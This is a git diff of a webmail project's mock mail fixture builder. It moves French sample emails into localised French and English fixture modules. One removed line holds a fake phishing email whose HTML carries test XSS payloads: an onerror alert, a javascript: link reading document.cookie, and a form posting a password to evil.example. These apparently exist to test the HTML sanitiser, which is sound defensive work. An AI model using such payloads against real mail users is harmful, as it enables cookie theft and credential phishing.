@@ -4,6 +4,10 @@
  * construits de façon synchrone pour que `resetMockStore()` reste synchrone.
  */
 import type { SpecialUse } from '#shared/types/mail'
+import type { AppLocale } from '#shared/types/i18n'
+import type { FixtureLocaleData } from './fixtures/types'
+import fixturesFr from './fixtures/fr'
+import fixturesEn from './fixtures/en'
 
 export interface FixtureAttachment {
   filename: string
@@ -120,49 +124,31 @@ export function buildFixtureRaw(m: FixtureMessage, index: number): Buffer {
 const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')
 const PDF = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n', 'latin1')
 
-const PEOPLE = [
-  'Camille Laurent <camille.laurent@universite.example>',
-  'Hugo Bernard <hugo.bernard@universite.example>',
-  'Léa Dubois <lea.dubois@universite.example>',
-  'Scolarité <scolarite@universite.example>',
-  'Nathan Moreau <nathan.moreau@universite.example>',
-  'Chloé Petit <chloe.petit@universite.example>',
-  'Service informatique <informatique@universite.example>',
-  'Inès Garcia <ines.garcia@universite.example>',
-]
-
-const TOPICS = [
-  ['Planning du projet tutoré 5.01', 'Voici le planning mis à jour pour le projet. Les soutenances auront lieu la semaine prochaine.'],
-  ['Compte rendu de réunion', 'Merci à tous pour votre présence. Vous trouverez ci-dessous les points abordés.'],
-  ['Changement de salle — cours de jeudi', 'Le cours de jeudi aura lieu en salle B204 au lieu de A102.'],
-  ['Rendu du projet web', 'Pensez à déposer votre projet sur Moodle avant vendredi 18 h.'],
-  ['Question sur le TP Vue.js', 'Est-ce que quelqu’un a réussi à faire fonctionner le routeur avec les paramètres dynamiques ?'],
-  ['Stage : offre en agence', 'Une agence locale recherche un·e stagiaire en développement front-end pour le printemps.'],
-  ['Maintenance du serveur mail', 'Le webmail sera indisponible samedi de 8 h à 10 h pour maintenance.'],
-  ['Relances absences', 'Merci de justifier vos absences auprès de la scolarité dans les plus brefs délais.'],
-  ['Photos de la journée portes ouvertes', 'Les photos de la JPO sont disponibles sur le drive du département.'],
-  ['Café ☕ jeudi ?', 'On se retrouve à la cafétéria jeudi à 10 h pour parler du projet ?'],
-] as const
+/** Jeux de textes localisés (server/lib/mail/fixtures/{fr,en}.ts) : mêmes clés, texte traduit. */
+const FIXTURES: Record<AppLocale, FixtureLocaleData> = { fr: fixturesFr, en: fixturesEn }
 
 /**
  * `me` : identité du titulaire de la boîte (nom affiché + adresse). Par défaut le
  * compte `dev` ; le mode démo (server/lib/demo/accounts.ts) réutilise ce même jeu
- * de données en l'adressant au compte visiteur généré.
+ * de données en l'adressant au compte visiteur généré, dans la langue résolue de sa
+ * requête de création (`locale`, français par défaut — comportement historique
+ * inchangé pour `dev@`/`alice@`).
  */
-export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.example>'): FixtureMessage[] {
+export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.example>', locale: AppLocale = 'fr'): FixtureMessage[] {
+  const t = FIXTURES[locale]
   const random = rng(20260918)
   const day = 86_400_000
   const list: FixtureMessage[] = []
 
   for (let i = 0; i < 62; i++) {
-    const topic = TOPICS[Math.floor(random() * TOPICS.length)] ?? TOPICS[0]
-    const from = PEOPLE[Math.floor(random() * PEOPLE.length)] ?? 'Camille Laurent <camille.laurent@universite.example>'
+    const topic = t.topics[Math.floor(random() * t.topics.length)] ?? t.topics[0]!
+    const from = t.people[Math.floor(random() * t.people.length)] ?? t.people[0]
     list.push({
       folder: 'INBOX',
       from,
       to: me,
-      subject: topic[0],
-      text: `Bonjour,\n\n${topic[1]}\n\nBonne journée,\n${from.split(' <')[0]}`,
+      subject: topic.subject,
+      text: `${t.greetingOpen}\n\n${topic.body}\n\n${t.greetingClose}\n${from.split(' <')[0]}`,
       date: new Date(now - Math.floor(random() * 90 * day) - 3 * day),
       seen: random() > 0.3,
       flagged: random() > 0.85,
@@ -173,42 +159,42 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
   list.push(
     {
       folder: 'INBOX',
-      from: 'Lettre du campus <newsletter@universite.example>',
+      from: locale === 'en' ? 'Campus Newsletter <newsletter@universite.example>' : 'Lettre du campus <newsletter@universite.example>',
       to: me,
-      subject: 'La lettre du campus — septembre',
-      text: 'La lettre du campus (version texte).',
-      html: '<div style="font-family:Arial;max-width:600px"><img src="https://cdn.example.org/header.png" alt="En-tête" width="600"><h1 style="color:#0b57d0">La lettre du campus</h1><p>Rentrée, projets, événements : toutes les nouvelles du mois.</p><img src="https://cdn.example.org/photo-jpo.jpg" alt="JPO"><img src="https://cdn.example.org/agenda.png" alt="Agenda"><p><a href="https://www.example.org/lettre">Lire en ligne</a></p><img src="https://track.example.org/open.gif?u=dev" width="1" height="1" alt=""></div>',
+      subject: t.newsletter.subject,
+      text: t.newsletter.text,
+      html: t.newsletter.html,
       date: new Date(now - 2 * 3_600_000),
       seen: false,
       flagged: false,
     },
     {
       folder: 'INBOX',
-      from: 'Service Comptabilité <compta@factures-urgentes.example>',
+      from: locale === 'en' ? 'Billing Department <compta@factures-urgentes.example>' : 'Service Comptabilité <compta@factures-urgentes.example>',
       to: me,
-      subject: 'Facture impayée — action requise',
-      html: '<p>Votre compte sera suspendu.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Payer maintenant</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
+      subject: t.phishing.subject,
+      html: t.phishing.html,
       date: new Date(now - 5 * 3_600_000),
       seen: false,
       flagged: false,
     },
     {
       folder: 'INBOX',
-      from: PEOPLE[3] ?? '',
+      from: t.people[3] ?? '',
       to: me,
-      subject: 'Relevé de notes — semestre 4',
-      text: 'Bonjour,\n\nVous trouverez votre relevé de notes en pièce jointe.\n\nLa scolarité',
-      attachments: [{ filename: 'releve-notes-S4.pdf', contentType: 'application/pdf', content: PDF }],
+      subject: t.gradeReport.subject,
+      text: t.gradeReport.text,
+      attachments: [{ filename: t.gradeReport.filename, contentType: 'application/pdf', content: PDF }],
       date: new Date(now - 26 * 3_600_000),
       seen: false,
       flagged: true,
     },
     {
       folder: 'INBOX',
-      from: PEOPLE[2] ?? '',
+      from: t.people[2] ?? '',
       to: me,
-      subject: 'Maquette avec logo intégré',
-      html: '<p>Voici la maquette avec le logo :</p><p><img src="cid:logo@demo" alt="Logo" width="64" height="64"></p>',
+      subject: t.logoMockup.subject,
+      html: t.logoMockup.html,
       attachments: [{ filename: 'logo.png', contentType: 'image/png', content: PNG, cid: 'logo@demo' }],
       date: new Date(now - 30 * 3_600_000),
       seen: true,
@@ -216,11 +202,11 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
     },
     {
       folder: 'INBOX',
-      from: PEOPLE[4] ?? '',
+      from: t.people[4] ?? '',
       to: me,
       cc: 'Alice Martin <alice@universite.example>',
-      subject: 'Un sujet très long pour vérifier que la liste des messages tronque correctement le texte sans casser la mise en page sur mobile à 320 pixels de large',
-      text: 'Texte court.',
+      subject: t.longSubject.subject,
+      text: t.longSubject.text,
       date: new Date(now - 50 * 3_600_000),
       seen: true,
       flagged: false,
@@ -232,14 +218,14 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
   list.push(
     {
       folder: 'INBOX',
-      from: PEOPLE[5] ?? '',
+      from: t.people[5] ?? '',
       to: me,
-      subject: 'Photos de la sortie',
-      text: 'Voici les photos de la sortie au musée, et mes notes.',
+      subject: t.fieldTrip.subject,
+      text: t.fieldTrip.text,
       attachments: [
         { filename: 'photo-1.png', contentType: 'image/png', content: PNG },
         { filename: 'photo-2.png', contentType: 'image/png', content: PNG_RED },
-        { filename: 'notes.txt', contentType: 'text/plain', content: Buffer.from('Notes de la sortie :\n- musée\n- déjeuner\n', 'utf8') },
+        { filename: t.fieldTrip.notesFilename, contentType: 'text/plain', content: Buffer.from(t.fieldTrip.notesContent, 'utf8') },
       ],
       date: new Date(now - 7 * 3_600_000),
       seen: false,
@@ -247,10 +233,10 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
     },
     {
       folder: 'INBOX',
-      from: PEOPLE[1] ?? '',
+      from: t.people[1] ?? '',
       to: me,
-      subject: 'Réunion : merci de confirmer',
-      text: 'Bonjour,\n\nMerci de confirmer la lecture de ce message avant la réunion de lundi.\n\nHugo',
+      subject: t.meetingConfirm.subject,
+      text: t.meetingConfirm.text,
       headers: {
         'X-Priority': '1 (Highest)',
         'Importance': 'High',
@@ -262,11 +248,11 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
     },
     {
       folder: 'INBOX',
-      from: PEOPLE[0] ?? '',
+      from: t.people[0] ?? '',
       to: me,
-      subject: 'Re: Planning',
-      text: 'Ça me va pour jeudi.\n\n> Le planning proposé : jeudi 14 h.',
-      html: '<p>Ça me va pour jeudi.</p><blockquote><p>Le planning proposé : jeudi 14 h.</p><blockquote><p>Message initial.</p></blockquote></blockquote>',
+      subject: t.replyThread.subject,
+      text: t.replyThread.text,
+      html: t.replyThread.html,
       date: new Date(now - 11 * 3_600_000),
       seen: true,
       flagged: false,
@@ -274,25 +260,25 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
   )
 
   for (let i = 0; i < 3; i++) {
-    list.push({ folder: 'INBOX.Envoyés', from: me, to: PEOPLE[i] ?? '', subject: `Re: ${TOPICS[i]?.[0] ?? ''}`, text: 'Merci, bien reçu !', date: new Date(now - (i + 1) * 2 * day), seen: true, flagged: false })
+    list.push({ folder: 'INBOX.Envoyés', from: me, to: t.people[i] ?? '', subject: `Re: ${t.topics[i]?.subject ?? ''}`, text: t.sentReplyBody, date: new Date(now - (i + 1) * 2 * day), seen: true, flagged: false })
   }
-  list.push({ folder: 'INBOX.Brouillons', from: me, to: 'Camille Laurent <camille.laurent@universite.example>', subject: 'Brouillon : idées pour le projet tutoré', text: 'Quelques idées à compléter…', date: new Date(now - day), seen: true, flagged: false, draft: true })
+  list.push({ folder: 'INBOX.Brouillons', from: me, to: t.people[0], subject: t.draft.subject, text: t.draft.text, date: new Date(now - day), seen: true, flagged: false, draft: true })
   for (let i = 0; i < 2; i++) {
-    list.push({ folder: 'INBOX.Corbeille', from: PEOPLE[6] ?? '', to: me, subject: `Ancienne notification ${i + 1}`, text: 'Notification supprimée.', date: new Date(now - (20 + i) * day), seen: true, flagged: false })
+    list.push({ folder: 'INBOX.Corbeille', from: t.people[6] ?? '', to: me, subject: t.trash.subject(i + 1), text: t.trash.text, date: new Date(now - (20 + i) * day), seen: true, flagged: false })
   }
   for (let i = 0; i < 3; i++) {
-    list.push({ folder: 'INBOX.Projets', from: PEOPLE[i + 1] ?? '', to: me, subject: `Projet tutoré — étape ${i + 1}`, text: `Étape ${i + 1} du projet tutoré.`, date: new Date(now - (4 + i) * day), seen: i > 0, flagged: false })
+    list.push({ folder: 'INBOX.Projets', from: t.people[i + 1] ?? '', to: me, subject: t.projects.subject(i + 1), text: t.projects.text(i + 1), date: new Date(now - (4 + i) * day), seen: i > 0, flagged: false })
   }
   // R2 : liste de diffusion, carte de visite, sous-dossier, dossier non abonné
   list.push({
     folder: 'INBOX',
-    from: PEOPLE[7] ?? '',
-    to: 'Liste Promo 2026 <liste-promo2026@universite.example>',
-    subject: 'Liste Promo 2026 : réunion de rentrée',
-    text: 'Bonjour à toutes et à tous,\n\nLa réunion de rentrée aura lieu mardi à 9 h en amphi.\n\nInès',
+    from: t.people[7] ?? '',
+    to: t.mailingList.to,
+    subject: t.mailingList.subject,
+    text: t.mailingList.text,
     headers: {
-      'List-Id': 'Liste Promo 2026 <liste-promo2026.universite.example>',
-      'List-Post': '<mailto:liste-promo2026@universite.example>',
+      'List-Id': t.mailingList.listId,
+      'List-Post': t.mailingList.listPost,
     },
     date: new Date(now - 13 * 3_600_000),
     seen: false,
@@ -300,10 +286,10 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
   })
   list.push({
     folder: 'INBOX',
-    from: PEOPLE[2] ?? '',
+    from: t.people[2] ?? '',
     to: me,
-    subject: 'Carte de visite de Léa',
-    text: 'Voici ma carte de visite, pour ton carnet d’adresses.',
+    subject: t.vcard.subject,
+    text: t.vcard.text,
     attachments: [{
       filename: 'lea-dubois.vcf',
       contentType: 'text/vcard',
@@ -314,8 +300,8 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
         'FN:Léa Dubois',
         'EMAIL;TYPE=WORK:lea.dubois@universite.example',
         'TEL;TYPE=CELL:+33 6 12 34 56 78',
-        'ORG:Université Exemple',
-        'TITLE:Enseignante',
+        `ORG:${t.vcard.org}`,
+        `TITLE:${t.vcard.title}`,
         'END:VCARD',
         '',
       ].join('\r\n'), 'utf8'),
@@ -324,17 +310,18 @@ export function devFixtures(now: number, me = 'Dev Webmail <dev@universite.examp
     seen: true,
     flagged: false,
   })
-  list.push({ folder: 'INBOX.Projets.2026', from: PEOPLE[4] ?? '', to: me, subject: 'Projet 2026 — cahier des charges', text: 'Le cahier des charges du projet 2026 est prêt.', date: new Date(now - 2 * day), seen: false, flagged: false })
-  list.push({ folder: 'INBOX.Anciens cours', from: PEOPLE[3] ?? '', to: me, subject: 'Archives du semestre 1', text: 'Documents du semestre 1.', date: new Date(now - 200 * day), seen: true, flagged: false })
-  list.push({ folder: 'INBOX.Spam', from: 'Gagnant <promo@loterie.example>', to: me, subject: 'Vous avez gagné un iPhone !!!', text: 'Cliquez ici.', date: new Date(now - 3 * day), seen: false, flagged: false })
+  list.push({ folder: 'INBOX.Projets.2026', from: t.people[4] ?? '', to: me, subject: t.projectsSubfolder.subject, text: t.projectsSubfolder.text, date: new Date(now - 2 * day), seen: false, flagged: false })
+  list.push({ folder: 'INBOX.Anciens cours', from: t.people[3] ?? '', to: me, subject: t.archives.subject, text: t.archives.text, date: new Date(now - 200 * day), seen: true, flagged: false })
+  list.push({ folder: 'INBOX.Spam', from: t.spam.from, to: me, subject: t.spam.subject, text: t.spam.text, date: new Date(now - 3 * day), seen: false, flagged: false })
   return list
 }
 
 export function aliceFixtures(now: number): FixtureMessage[] {
   const me = 'Alice Martin <alice@universite.example>'
+  const people = fixturesFr.people
   return Array.from({ length: 5 }, (_, i) => ({
     folder: 'INBOX',
-    from: PEOPLE[i] ?? '',
+    from: people[i] ?? '',
     to: me,
     subject: `Message pour Alice n°${i + 1}`,
     text: `Bonjour Alice, ceci est le message ${i + 1}.`,
